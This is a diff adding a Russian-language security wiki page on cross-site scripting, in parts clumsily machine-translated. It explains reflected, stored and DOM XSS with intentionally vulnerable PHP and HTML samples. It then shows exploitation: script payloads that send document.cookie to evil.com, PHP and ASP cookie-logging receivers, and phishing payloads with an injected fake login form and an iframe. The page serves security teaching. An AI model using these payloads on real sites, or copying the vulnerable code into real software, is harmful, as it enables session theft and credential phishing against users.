+                  <a href="https://github.com/anakilivo/wiki/edit/main/docs/web/xss.ru.md" title="Редактировать страницу" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  <h1>XSS</h1>
+                
+                <ul>
+<li><a href="../xss">english</a></li>
+</ul>
+<h2 id="xss">Введение в XSS</h2>
+<p>Межсайтовый скриптинг (XSS) - это уязвимость компьютерной безопасности, которая часто появляется в веб-приложениях. Это
+вызвано недостаточной фильтрацией пользовательского ввода WEB-приложениями. Злоумышленники используют уязвимости
+веб-сайтов для внедрения кода вредоносного сценария на веб-страницы. Когда другие пользователи просматривают эти
+веб-страницы, вредоносный код запускается. Пострадавшие пользователи могут подвергаться различным атакам, таким как
+кража данных cookie, захват сеанса и фишинг.</p>
+<h3 id="xss_1">Светоотражающий XSS</h3>
+<p>Отраженный межсайтовый скриптинг (Reflected Cross-Site Scripting) является наиболее распространенным и широко
+используемым, который может прикреплять вредоносные скрипты к параметрам URL-адресов.</p>
+<p>Отраженный XSS обычно используется злоумышленниками, чтобы побудить пользователей посетить URL-адрес, содержащий
+вредоносный код, с помощью определенных методов (например, электронной почты). Когда жертва нажимает на эти специально
+разработанные ссылки, вредоносный код оказывается прямо на хосте жертвы. Выполнить в браузере. Этот тип XSS обычно
+появляется в строке поиска веб-сайта, в порту входа пользователя и т. Д. И часто используется для кражи клиентских
+файлов cookie или фишинга.</p>
+<p>Серверный код:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
+<span class="c1">// Is there any input? </span>
+<span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span> <span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="c1">// Feedback for end user </span>
+    <span class="k">echo</span><span class="s1">&#39;&lt;pre&gt;Hello &#39;</span><span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> 
+<span class="p">}</span> 
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Код может быть прямой ссылкой на аргумент <code>name</code> и не выполняет никакой фильтрации и проверки, есть очевидные
+уязвимости XSS.</p>
+<h3 id="xss_2">Постоянный XSS</h3>
+<p>Постоянные межсайтовые сценарии также эквивалентны сохраненным межсайтовым сценариям.</p>
+<p>Этот тип XSS не требует от пользователя щелчка по-определенному URL-адресу для выполнения межсайтового скриптинга.
+Злоумышленник заранее загружает или сохраняет вредоносный код на уязвимом сервере и выполняет вредоносный код, пока
+жертва просматривает страницу, содержащую вредоносный код. Постоянный XSS обычно появляется во взаимодействиях, таких
+как сообщения веб-сайта, комментарии и журналы блога, а вредоносные сценарии хранятся в базе данных клиента или сервера.</p>
+<p>Серверный код:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+  <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;btnSign&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="c1">// Get input</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mtxMessage&#39;</span><span class="p">]</span> <span class="p">);</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;txtName&#39;</span><span class="p">]</span> <span class="p">);</span>
+    <span class="c1">// Sanitize message input</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span> <span class="nv">$message</span> <span class="p">);</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$message</span> <span class="p">);</span>
+    <span class="c1">// Sanitize name input</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">);</span>
+    <span class="c1">// Update database</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO guestbook (comment, name) VALUES (&#39;</span><span class="si">$message</span><span class="s2">&#39;,&#39;</span><span class="si">$name</span><span class="s2">&#39; );&quot;</span><span class="p">;</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span> <span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span> <span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+    <span class="c1">//mysql_close();}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Код удаляет или экранирует только некоторые пробельные символы, специальные символы и обратную косую черту. Он не
+фильтрует и не проверяет XSS и хранится в базе данных. Очевидно, что существует сохраненная уязвимость XSS.</p>
+<h3 id="dom-xss">DOM XSS</h3>
+<p>Традиционные уязвимости XSS обычно появляются в коде на стороне сервера, в то время как XSS на основе DOM - это
+уязвимость, основанная на объектной модели документа DOM, поэтому на нее влияет код сценария клиентского браузера.
+Клиентский JavaScript может получить доступ к текстовой объектной модели DOM браузера, поэтому он может определить
+URL-адрес, используемый для загрузки текущей страницы. Другими словами, программа-сценарий на стороне клиента может
+динамически проверять и изменять содержимое страницы через DOM. Он не зависит от данных на стороне сервера, но получает
+данные в DOM от клиента (например, извлекает данные из URL-адреса) и выполняет их локально. С другой стороны,
+пользователи браузера могут манипулировать некоторыми объектами в DOM, такими как URL, местоположение и т. Д. Если
+данные, введенные пользователем на клиенте, содержат вредоносные сценарии JavaScript, и эти сценарии не фильтруются и не
+вылечиваются должным образом, приложение могут подвергаться XSS-атакам на основе DOM.</p>
+<p>HTML код:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>DOM-XSS test<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;a=&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mf">2</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Сохраните код в domXSS.html, доступ через браузер:</p>
+<div class="highlight"><pre><span></span><code>http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+</code></pre></div>
+<p>Вы можете вызвать уязвимость XSS.</p>
+<h2 id="xss_3">Использование XSS</h2>
+<h3 id="cookie">Кража файлов cookie</h3>
+<p>Злоумышленник может использовать следующий код для получения информации cookie клиента:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+    <span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span> <span class="err">+</span><span class="na">document</span><span class="err">.</span><span class="na">cookie</span><span class="p">&gt;&lt;/</span><span class="nt">img</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>На удаленном сервере есть файл, который принимает и записывает информацию о файлах cookie, например:</p>
+<div class="highlight"><pre><span></span><code>&lt;%
+  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)
+  testfile=Server.MapPath(&quot;cookie.txt&quot;)
+  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)
+  set thisfile=fs.OpenTextFile(testfile,8,True,0)
+  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)
+  thisfile.close
+  set fs=nothing
+%&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
+<span class="nv">$log</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;cookie.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span>
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$log</span><span class="p">,</span> <span class="nv">$cookie</span><span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$log</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>После того, как злоумышленник получит файлы cookie, он может войти в учетную запись жертвы, изменив файлы cookie
+локального браузера.</p>
+<h3 id="_1">Захват сеанса</h3>
+<p>Из-за определенных недостатков безопасности при использовании файлов cookie разработчики начали использовать более
+безопасные методы аутентификации, такие как сеанс. В механизме сеанса клиент и сервер используют идентификаторы для
+идентификации пользователей и поддержания сеанса, но этот идентификатор также может использоваться другими. Суть
+перехвата сеанса состоит в том, чтобы задействовать файлы cookie и отправить их на сервер.</p>
+<p>Например, в системе сообщений CMS хранится уязвимость XSS. Злоумышленник записывает код XSS в сообщение сообщения. Когда
+администратор входит в фоновый режим и проверяет Да, срабатывает XSS-уязвимость. Поскольку XSS запускается в фоновом
+режиме, целью атаки является администратор. Внедряя код JavaScript, злоумышленник может захватить сеанс администратора
+для выполнения определенных операций, тем самым достигнув цели повышения разрешений.</p>
+<p>Например, если злоумышленник хочет использовать XSS для добавления учетной записи администратора, ему нужно только
+использовать предыдущий аудит кода или другие методы для перехвата информации HTTP-запроса при добавлении учетной записи
+администратора, а затем использовать объект XMLHTTP для отправки HTTP запрос в фоновом режиме. Запрос сопровождается
+файлами cookie атакуемого и отправляется на сервер вместе, после чего может быть реализована операция добавления учетной
+записи администратора.</p>
+<h3 id="_2">Фишинг</h3>
+<ul>
+<li>
+<p>Перенаправить фишинг</p>
+<p>Перенаправить текущую страницу на фишинговую.</p>
+<div class="highlight"><pre><span></span><code>http://www.bug.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;
+</code></pre></div>
+</li>
+<li>
+<p>HTML-инъекция фишинга</p>
+<p>Используйте уязвимости XSS для внедрения кода HTML или JavaScript на страницу.</p>
+<div class="highlight"><pre><span></span><code>http://www.bug.com/index.php?search=&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center; &quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password :&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre></div>
+<p>Этот код встроит форму в обычную страницу.</p>
+</li>
+<li>
+<p>iframe фишинг</p>
+<p>Это посредством фишинговых тегов вариантов <code>&lt;iframe&gt;</code>, встроенных в страницу удаленного домена.</p>
+<div class="highlight"><pre><span></span><code>http://www.bug.com/index.php?search=&#39;&gt;&lt;iframe src = &quot;http://www.evil.com&quot; height = &quot;100%&quot; width = &quot;100%&quot; &lt;/iframe&gt;
+</code></pre></div>
+</li>
+<li>
+<p>Флэш-фишинг</p>
+<p>Созданный входящий файловый сервер Flash на целевом сайте со ссылкой на метку <code>&lt;object&gt;</code> или <code>&lt;embed&gt;</code>.</p>
+</li>
+<li>
+<p>Продвинутые техники фишинга</p>
+<p>Внедрить код для взлома HTML-форм, использовать JavaScript для написания клавиатурных шпионов и тд.</p>
+</li>
+</ul>
+<h3 id="-">Веб-страница висит лошадь</h3>
+<p>Обычно это достигается путем подделки страницы, как это используется в теге XSS <code>&lt;iframe&gt;</code>.</p>
+<h3 id="dos-ddos">DOS и DDOS</h3>
+<p>Внедрение вредоносного кода JavaScript может вызвать некоторые атаки типа «отказ в обслуживании».</p>
+<h3 id="xss-">XSS-червь</h3>
+<p>Благодаря тщательно составленному коду XSS можно реализовать множество функций, таких как незаконная передача, подделка
+информации, удаление статей, самокопирование и тд.</p>
+<h2 id="self-xss">Self-XSS превращает отходы в сокровища</h2>
+<p>Self-XSS, как следует из названия, заключается в том, что точка с уязвимостями XSS может быть запущена только самим
+злоумышленником, то есть он атакует свою собственную. Например, точка входа в личную приватность имеет XSS. Однако,
+поскольку эту личную информацию может просматривать только пользователь, ее нельзя использовать для атак других. Такие
+лазейки обычно очень маленькие и кажутся немного безвкусными. Но в некоторых конкретных сценариях сочетание с другими
+уязвимостями (такими как CSRF) может превратить Self-XSS во вредоносную уязвимость. Ниже приводится краткое описание
+некоторых распространенных сценариев, в которых можно использовать Self-XSS.</p>
+<ul>
+<li>
+<p>CSRF существует для входа и выхода, Self-XSS для личной информации, сторонний вход</p>
+<p>Общий процесс использования этого сценария заключается в том, что злоумышленник сначала вводит полезную нагрузку в точку
+XSS личной информации, а затем злоумышленник создает вредоносную страницу, чтобы побудить жертву посетить, и вредоносная
+страница выполняет следующие операции:</p>
+<ol>
+<li>Выполнение вредоносной страницы использует CSRF, чтобы позволить жертве войти в расположение личной информации
+  злоумышленника и запустить полезную нагрузку XSS.</li>
+<li>Создание тега <code>&lt;iframe&gt;</code> полезной нагрузки JavaScript и выполнение этих операций в среде.</li>
+<li>Разрешить жертве выйти из аккаунта злоумышленника</li>
+<li>Затем позвольте жертве войти в интерфейс личной информации своей учетной записи через CSRF.</li>
+<li>Злоумышленник извлекает токен CSRF со страницы</li>
+<li>Затем вы можете использовать токен CSRF для отправки и изменения личной информации пользователя.</li>
+</ol>
+<p>В этом процессе атаки необходимо обратить внимание на несколько моментов: третий шаг входа в систему не требует
+взаимодействия с пользователем, используйте методы входа без пароля, такие как Google Sign In, для входа в систему;
+<strong>X-Frame-Options</strong> необходимо установить на то же происхождение (страница может быть в том же доменном имени).</p>
+</li>
+<li>
+<p>CSRF существует для входа в систему, Self-XSS существует для информации учетной записи, аутентификация OAUTH</p>
+<ol>
+<li>Разрешить пользователю выйти из страницы учетной записи, но не выходить из страницы авторизации OAUTH, это 
+     необходимо для того, чтобы пользователь мог снова войти на страницу своей учетной записи.</li>
+<li>Разрешение пользователям войти в нашу учетную запись, на странице появляется XSS, использование меток 
+     <code>&lt;iframe&gt;</code> для выполнения вредоносного кода</li>
+<li>Войдите в их соответствующие учетные записи, но наш XSS был украден для сеанса</li>
+</ol>
+</li>
+</ul>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../sqli.ru" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Назад
+                </span>
+                Sqli
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../ssrf.ru" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Вперед
+                </span>
+                SSRF
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2021 Illia Novak
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/anakilivo" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.linkedin.com/in/illia-novak/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+    
+      
+      
+      <a href="mailto:anakilivo@gmail.com" target="_blank" rel="noopener" title="" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M476 3.2L12.5 270.6c-18.1 10.4-15.8 35.6 2.2 43.2L121 358.4l287.3-253.2c5.5-4.9 13.3 2.6 8.6 8.3L176 407v80.5c0 23.6 28.5 32.9 42.5 15.8L282 426l124.6 52.2c14.2 6 30.4-2.9 33-18.2l72-432C515 7.8 493.3-6.8 476 3.2z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.53cc9318.min.js"></script>
+      <script src="../../assets/javascripts/bundle.e9c9f54f.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0432 \u0431\u0443\u0444\u0435\u0440", "clipboard.copied": "\u0421\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u043e \u0432 \u0431\u0443\u0444\u0435\u0440", "search.config.lang": "ru", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "\u041f\u043e\u0438\u0441\u043a", "search.result.placeholder": "\u041d\u0430\u0447\u043d\u0438\u0442\u0435 \u043f\u0435\u0447\u0430\u0442\u0430\u0442\u044c \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430", "search.result.none": "\u0421\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e", "search.result.one": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e 1 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435", "search.result.other": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e # \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+        <script src="../../javascripts/config.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
